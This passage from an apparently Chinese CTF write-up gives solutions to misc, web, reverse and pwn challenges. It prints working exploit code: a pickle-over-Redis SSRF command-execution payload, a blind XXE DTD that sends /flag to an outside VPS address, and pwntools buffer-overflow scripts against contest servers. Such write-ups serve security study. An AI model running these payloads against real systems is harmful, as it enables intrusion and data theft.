+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;flag.txt not found&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;flag: </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>连接后
+1.先比较token
+2.然后用token做密码去压缩
+3.要用以“flag{”开头的字符串
+4.得到解压的flag
+其中
+token在处理时，在第65置0，所以就要token的前64位
+3步中要绕过flag{，可以通过传DEL（ASCII:127）删除
+payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob03.contest.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10003</span><span class="p">,</span> <span class="n">level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">b</span><span class="s1">&#39;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#39;</span><span class="p">)</span><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your token:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;flag{&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;your flag:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h1 id="web">
+<a class="header-anchor" href="#web"></a>
+Web
+</h1><h2 id="phpsql">
+<a class="header-anchor" href="#phpsql"></a>
+phpsql
+</h2><p>注册admin显示已经存在</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714992887587-02327559-9444-4a1a-a1f9-dd0e928c598d.png" alt="image.png"></p>
+<p>结合题目phpsql应该是万能密码注入进入后台
+直接拿sql语句字典跑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993045758-5d5a39af-821d-4573-92f8-1acbce11c6f0.png" alt="image.png"></p>
+<p>直接跑进去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993089174-839db6d3-1ae0-4e02-aa7d-90c465139d17.png" alt="image.png"></p>
+<h2 id="pyssrf">
+<a class="header-anchor" href="#pyssrf"></a>
+pyssrf
+</h2><p>根据题目与提示pyssrf加什么年代了还用python3.7.1
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994494037-64fd117e-7f50-497c-adde-f2b742683b6e.png" alt="image.png">
+python3.7.1的环境中,urllib有请求头注入
+redis 解析
+GET /?
+payload
+padding
+基本上可以理解为
+pickle反序列化+redis+rce+ssrf</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import base64
+</span></span><span class="line"><span class="cl">import hashlib
+</span></span><span class="line"><span class="cl">opcode=&#39;&#39;&#39;(S&#39;mkdir ./static;cp /flag ./static/f&#39;
+</span></span><span class="line"><span class="cl">ios
+</span></span><span class="line"><span class="cl">system
+</span></span><span class="line"><span class="cl">.&#39;&#39;&#39;.encode(&#39;utf-8&#39;)
+</span></span><span class="line"><span class="cl">key=hashlib.md5(&#34;http://test/&#34;.encode()).hexdigest()
+</span></span><span class="line"><span class="cl">value=base64.b64encode(opcode).decode(&#39;utf-8&#39;)
+</span></span><span class="line"><span class="cl">print(&#39;set&#39;,key,value)
+</span></span></code></pre></div><p>得到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set 0439e1ff2e65e21dcf4bba4c26a0dab2 KFMnbWtkaXIgLi9zdGF0aWM7Y3AgL2ZsYWcgLi9zdGF0aWMvZicKaW9zCnN5c3RlbQou
+</span></span></code></pre></div><p>构造url</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=127.0.0.1:6379?%0d%0aset%200439e1ff2e65e21dcf4bba4c26a0dab2%20KFMnbWtkaXIgLi9zdGF0aWM7Y3AgL2ZsYWcgLi9zdGF0aWMvZicKaW9zCnN5c3RlbQou%0d%0apadding%0d%0a
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994544337-8fb892d3-eb1f-4eb6-8519-8009cbc7f922.png" alt="image.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?url=test/
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994558947-f9549518-8176-46fa-8351-57e63ed42029.png" alt="image.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/static/f
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994569753-437c68fe-8887-4069-b2da-66a5ce52d809.png" alt="image.png">
+打开即可得到flag
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994749430-228bc4a8-970d-4ba2-be9e-40588181af13.png" alt="image.png"></p>
+<h2 id="fileit">
+<a class="header-anchor" href="#fileit"></a>
+fileit
+</h2><p>源码有提示
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993406997-f9ee5e83-dd7b-4205-b62b-96a9dc140d30.png" alt="image.png">
+测试后发现要打无回显xxe
+vps创建flag.dtd文件，内容如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % ccc &#34;&lt;!ENTITY &amp;#x25; aba SYSTEM &#39;http://43.143.167.75:8888?x=%file;&#39;&gt;&#34;&gt;
+</span></span><span class="line"><span class="cl">%ccc;
+</span></span><span class="line"><span class="cl">%aba;
+</span></span></code></pre></div><p>创建完成后，在当前目录起python服务
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993610279-870a1647-d25a-4e40-bb49-5c79545d395b.png" alt="image.png">
+payload如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
+</span></span><span class="line"><span class="cl">    &lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/flag&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;!ENTITY % xxe SYSTEM &#34;http://43.143.167.75:8888/flag.dtd&#34;&gt;
+</span></span><span class="line"><span class="cl">    %xxe;
+</span></span><span class="line"><span class="cl">    ]&gt;
+</span></span></code></pre></div><p>初始页面抓包后，post传参：
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993694538-4c066cf9-fdf1-4797-8480-57b979fc7e14.png" alt="image.png">
+发送后，vps就会显示接收的数据
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993724668-023b3aaa-ce9d-4493-bc71-bba222e1d145.png" alt="image.png">
+base64解码，拿到flag
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714993743242-9254f3fc-1ecb-4b04-b0cf-c98c234f8510.png" alt="image.png"></p>
+<h1 id="reverse">
+<a class="header-anchor" href="#reverse"></a>
+Reverse
+</h1><h2 id="ezayre">
+<a class="header-anchor" href="#ezayre"></a>
+ezayre
+</h2><p>64位无壳elf，拉进ida看看
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765706-a3095736-a5b7-47ba-b23d-866b730cb950.png" alt="">
+锁定主要函数是sub_1208，跟进之后有爆红，修好之后加密逻辑如下，看到下图标红处之后，感觉是base64
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765742-1cdb534e-27d7-4cc4-bd45-aa83c1012e4d.png" alt="">
+直接查找一下字符串
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765707-401ce508-7aea-4897-b4c8-b0654fdb8d8e.png" alt="">
+看见变表和密文之后直接秒了
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765583-e9e645b8-9ff4-46fd-9c35-39f31dbd8769.png" alt=""></p>
+<h2 id="babyre">
+<a class="header-anchor" href="#babyre"></a>
+babyre
+</h2><p>正常脱upx壳之后拉进ida
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001765670-b0ad82b2-4f5e-497d-a3c4-2ece25075536.png" alt="">
+直接把四个函数中的加密逆一下，都是一些基本加密操作，直接爆破一下，注意爆破的取值区间是0~2^32-1,包含所有32无符号整数，把内容合一下，exp如下（PS:第一个函数就加减值加密，不写入函数了就)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_1257</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0x8E03BEC3</span><span class="p">)</span> <span class="o">-</span> <span class="mi">3</span> <span class="o">*</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0x71FC413C</span><span class="p">)</span> <span class="o">+</span> <span class="n">a1</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1876131848</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_12A4</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">&gt;</span> <span class="mh">0x10000000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">((</span><span class="o">~</span><span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0xA8453437</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0xA8453437</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="o">-</span><span class="mi">3</span> <span class="o">*</span> <span class="p">(</span><span class="o">~</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0xA8453437</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0xA8453437</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="mi">10</span> <span class="o">*</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0xA8453437</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="o">+</span> <span class="p">(</span><span class="n">a1</span> <span class="o">^</span> <span class="mh">0xA8453437</span><span class="p">))</span> <span class="o">==</span> <span class="mi">551387557</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_1346</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">&gt;</span> <span class="mh">0x10000000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="mi">11</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="n">a1</span> <span class="o">^</span> <span class="mh">0xE33B67BD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0xE33B67BD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">-</span> <span class="p">(</span><span class="mi">6</span> <span class="o">*</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0xE33B67BD</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="o">+</span> <span class="mi">12</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0xE33B67BD</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0xD2C7FC0C</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="o">-</span><span class="mi">5</span> <span class="o">*</span> <span class="n">a1</span>
+</span></span><span class="line"><span class="cl">     <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0xD2C7FC0C</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="o">~</span><span class="p">(</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0x2D3803F3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&amp;</span> <span class="mh">0x2D3803F3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="o">-</span> <span class="o">-</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">a1</span> <span class="o">|</span> <span class="mh">0x2D3803F3</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xCE1066DC</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;flag{&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xADB1D018LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="o">+</span><span class="mh">0x36145344</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%08x&#34;</span><span class="p">,</span><span class="n">b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="o">^</span><span class="mi">32</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bbq</span> <span class="o">=</span> <span class="nf">sub_1257</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="n">bbq</span><span class="o">==</span><span class="mi">0LL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%08x&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="o">^</span><span class="mi">32</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bbq</span> <span class="o">=</span> <span class="nf">sub_12A4</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="n">bbq</span><span class="o">==</span><span class="mi">0LL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%08x&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;-&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="o">^</span><span class="mi">32</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bbq</span> <span class="o">=</span> <span class="nf">sub_1346</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="n">bbq</span><span class="o">==</span><span class="mi">0LL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%08x&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//flag{e3c6235c-05d9434d-04b1edf3-04034083}
+</span></span></span></code></pre></div><h1 id="pwn">
+<a class="header-anchor" href="#pwn"></a>
+Pwn
+</h1><h2 id="babypwn">
+<a class="header-anchor" href="#babypwn"></a>
+babypwn
+</h2><ul>
+<li>ret2text</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob07.contest.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10007</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Please input your token: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your username: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;root&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;!@#$%^&amp;*()_+&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span><span class="o">=</span><span class="mh">0x38</span> <span class="o">-</span> <span class="n">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40117A</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the password: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="login">
+<a class="header-anchor" href="#login"></a>
+Login
+</h2><p>密码处输入字符过长溢出，密码自己出来了
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714996681718-deba3f05-beb0-4cd5-9e82-68eaecfb43a3.png" alt="image.png">
+elf文件泄露，使用脚本提取</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p = remote(&#39;prob04.contest.pku.edu.cn&#39;, 10004, level = &#39;debug&#39;)
+</span></span><span class="line"><span class="cl">p.sendlineafter(b&#39;Please input your token: &#39;,
+</span></span><span class="line"><span class="cl">                b&#39;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.sendlineafter(b&#39;Username:&#39;, b&#39;admin&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.sendlineafter(b&#39;Password:&#39;, b&#39;1q2w3e4r&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">data = p.recvall()
+</span></span><span class="line"><span class="cl">flag = data.find(b&#39;\x7fELF&#39;)
+</span></span><span class="line"><span class="cl">if flag ==-1:
+</span></span><span class="line"><span class="cl">    datas = data
+</span></span><span class="line"><span class="cl">else:
+</span></span><span class="line"><span class="cl">    datas = data[flag:]
+</span></span><span class="line"><span class="cl">
